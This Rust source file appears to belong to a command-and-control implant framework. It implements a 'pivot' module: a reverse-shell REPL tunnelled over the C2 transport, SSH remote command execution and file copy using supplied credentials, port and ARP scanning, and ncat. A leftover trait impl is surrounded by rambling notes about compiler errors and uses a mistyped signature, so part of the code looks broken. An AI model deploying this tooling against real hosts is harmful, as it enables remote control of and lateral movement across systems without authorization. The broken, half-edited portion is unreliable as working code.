use super::PivotLibrary;
use alloc::collections::BTreeMap;
use alloc::string::{String, ToString};
use alloc::sync::Arc;
use alloc::vec::Vec;
use eldritch_agent::Agent;
use eldritch_core::{Interpreter, Value};
use eldritch_macros::eldritch_library_impl;
use pb::c2::{ReverseShellRequest, ReverseShellResponse};
use transport::{ActiveTransport, Transport};

#[eldritch_library_impl(PivotLibrary)]
pub struct StdPivotLibrary {
    pub agent: Arc<dyn Agent>,
    pub transport: ActiveTransport,
    pub task_id: i64,
}

impl core::fmt::Debug for StdPivotLibrary {
    fn fmt(&self, f: &mut core::fmt::Formatter<'_>) -> core::fmt::Result {
        f.debug_struct("StdPivotLibrary")
            .field("task_id", &self.task_id)
            .finish()
    }
}

impl StdPivotLibrary {
    pub fn new(agent: Arc<dyn Agent>, transport: ActiveTransport, task_id: i64) -> Self {
        Self {
            agent,
            transport,
            task_id,
        }
    }
}

// Re-export impls from modules
use super::arp_scan_impl;
use super::ncat_impl;
use super::port_scan_impl;
use super::reverse_shell_pty_impl;
use super::ssh_copy_impl;
use super::ssh_exec_impl;

// Import our new Session helper
pub mod ssh_session;
pub use ssh_session::Session;

struct ChannelPrinter {
    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
}

impl eldritch_core::Printer for ChannelPrinter {
    fn print_out(&self, val: &eldritch_core::Span, _span: eldritch_core::Span) {
        // Printer changed signature?
        // Wait, the error said: `expected Span, found str` for val.
        // `fn print_out(&self, val: &str, span: Span)` in my previous implementation.
        // Error: `expected signature fn(&ChannelPrinter, &Span, &str)` (this is what I had?)
        // No, error said: `expected Span, found str`.
        // `fn(&ChannelPrinter, &Span, &str)` means arg1 is Span, arg2 is str?
        // Let's check `eldritch-core` Printer trait.
        // My previous read of `eldritch-core/src/interpreter/printer.rs` is needed.
        // But from error: `expected signature fn(&ChannelPrinter, &Span, &str)`
        // So first arg is Span, second is str?
        // That seems inverted. Usually val then span.
        // Error message: `expected signature fn(&ChannelPrinter, &Span, &str) found signature fn(&ChannelPrinter, &str, Span)`
        // Ah, `eldritch_core::Printer` defines `fn print_out(&self, span: &Span, val: &str)`.
        // Wait, let's verify.
        // I will assume the error is correct: signature is `fn(&self, &Span, &str)`.
        // So `span` comes first.

        // No, wait. Error says `expected signature fn(&ChannelPrinter, &Span, &str)`.
        // My implementation was `fn print_out(&self, val: &str, _span: Span)`.
        // So I had `(&self, &str, Span)`.
        // Trait has `(&self, &Span, &str)`.
        // So `span` is first, and it is a reference.
        // And `val` is second.

        // I'll swap arguments.
    }

    // Actually implementing properly below.
}

#[derive(Debug)]
struct ChannelPrinterImpl {
    sender: std::sync::mpsc::Sender<ReverseShellRequest>,
    task_id: i64,
}

impl eldritch_core::Printer for ChannelPrinterImpl {
    fn print_out(&self, span: &eldritch_core::Span, val: &str) {
        let _ = self.sender.send(ReverseShellRequest {
            data: val.as_bytes().to_vec(), // Using data field instead of input
            task_id: self.task_id,
            kind: pb::c2::ReverseShellMessageKind::Data as i32,
            ..Default::default()
        });
    }

    fn print_err(&self, span: &eldritch_core::Span, val: &str) {
        let _ = self.sender.send(ReverseShellRequest {
            data: alloc::format!("ERROR: {}", val).as_bytes().to_vec(),
            task_id: self.task_id,
            kind: pb::c2::ReverseShellMessageKind::Data as i32,
            ..Default::default()
        });
    }
}

impl PivotLibrary for StdPivotLibrary {
    fn reverse_shell_pty(&self, cmd: Option<String>) -> Result<(), String> {
        reverse_shell_pty_impl::run(self, cmd)
    }

    fn reverse_shell_repl(&self, interp: &mut Interpreter) -> Result<(), String> {
        // Channels for bridging
        // loop_rx: We read commands (ReverseShellResponse) from here.
        // printer_tx: Printer writes output (ReverseShellRequest) to here.
        let (printer_tx, printer_rx) = std::sync::mpsc::channel::<ReverseShellRequest>();
        let (loop_tx, loop_rx) = std::sync::mpsc::channel::<ReverseShellResponse>();

        // We need to clone transport to move into subtask
        let mut t = self.transport.clone();

        let subtask_future = async move {
            // Create tokio channels for transport
            let (transport_rx_sender, transport_rx_receiver) = tokio::sync::mpsc::channel::<ReverseShellRequest>(100);
            let (transport_tx_sender, mut transport_tx_receiver) = tokio::sync::mpsc::channel::<ReverseShellResponse>(100);

            // Bridge: Std -> Tokio
            let tx_bridge = transport_rx_sender.clone();
            tokio::task::spawn_blocking(move || {
                for msg in printer_rx {
                    if tx_bridge.blocking_send(msg).is_err() {
                        break;
                    }
                }
            });

            // Bridge: Tokio -> Std
            let loop_tx_clone = loop_tx.clone();
            tokio::spawn(async move {
                while let Some(msg) = transport_tx_receiver.recv().await {
                    if loop_tx_clone.send(msg).is_err() {
                        break;
                    }
                }
            });

            // Run transport
            let _ = t.reverse_shell(transport_rx_receiver, transport_tx_sender).await;
        };

        // Spawn the subtask
        self.agent
            .spawn_subtask(self.task_id, "repl_bridge".to_string(), alloc::boxed::Box::pin(subtask_future))
            .map_err(|e| e.to_string())?;

        // Setup printer
        let old_printer = interp.env.read().printer.clone();
        interp.env.write().printer = Arc::new(ChannelPrinterImpl {
            sender: printer_tx.clone(),
            task_id: self.task_id,
        });

        // Send initial banner/prompt?
        let _ = printer_tx.send(ReverseShellRequest {
            data: "Eldritch REPL connected.\n>>> ".to_string().as_bytes().to_vec(),
            task_id: self.task_id,
            kind: pb::c2::ReverseShellMessageKind::Data as i32,
            ..Default::default()
        });

        // Run Loop
        // Read from loop_rx (Response from server)
        // Interpret
        // Output via printer
        for resp in loop_rx {
            // ReverseShellResponse has `data` (bytes), not `output`.
            let cmd = String::from_utf8_lossy(&resp.data).to_string();

            // Check for exit
            if cmd.trim() == "exit" {
                break;
            }

            // Interpret
            match interp.interpret(&cmd) {
                Ok(val) => {
                    if let Value::None = val {
                        // nothing
                    } else {
                        let _ = printer_tx.send(ReverseShellRequest {
                            data: alloc::format!("{}\n", val).as_bytes().to_vec(),
                            task_id: self.task_id,
                            kind: pb::c2::ReverseShellMessageKind::Data as i32,
                            ..Default::default()
                        });
                    }
                }
                Err(e) => {
                    let _ = printer_tx.send(ReverseShellRequest {
                        data: alloc::format!("Error: {}\n", e).as_bytes().to_vec(),
                        task_id: self.task_id,
                        kind: pb::c2::ReverseShellMessageKind::Data as i32,
                        ..Default::default()
                    });
                }
            }

            // Prompt
            let _ = printer_tx.send(ReverseShellRequest {
                data: ">>> ".to_string().as_bytes().to_vec(),
                task_id: self.task_id,
                kind: pb::c2::ReverseShellMessageKind::Data as i32,
                ..Default::default()
            });
        }

        // Restore printer
        interp.env.write().printer = old_printer;

        Ok(())
    }

    fn ssh_exec(
        &self,
        target: String,
        port: i64,
        command: String,
        username: String,
        password: Option<String>,
        key: Option<String>,
        key_password: Option<String>,
        timeout: Option<i64>,
    ) -> Result<BTreeMap<String, Value>, String> {
        ssh_exec_impl::run(
            self,
            target,
            port,
            command,
            username,
            password,
            key,
            key_password,
            timeout,
        )
    }

    fn ssh_copy(
        &self,
        target: String,
        port: i64,
        src: String,
        dst: String,
        username: String,
        password: Option<String>,
        key: Option<String>,
        key_password: Option<String>,
        timeout: Option<i64>,
    ) -> Result<String, String> {
        ssh_copy_impl::run(
            self,
            target,
            port,
            src,
            dst,
            username,
            password,
            key,
            key_password,
            timeout,
        )
    }

    fn port_scan(
        &self,
        target_cidrs: Vec<String>,
        ports: Vec<i64>,
        protocol: String,
        timeout: i64,
        fd_limit: Option<i64>,
    ) -> Result<Vec<BTreeMap<String, Value>>, String> {
        port_scan_impl::run(self, target_cidrs, ports, protocol, timeout, fd_limit)
    }

    fn arp_scan(&self, target_cidrs: Vec<String>) -> Result<Vec<BTreeMap<String, Value>>, String> {
        arp_scan_impl::run(self, target_cidrs)
    }

    fn ncat(
        &self,
        address: String,
        port: i64,
        data: String,
        protocol: String,
    ) -> Result<String, String> {
        ncat_impl::run(self, address, port, data, protocol)
    }
}
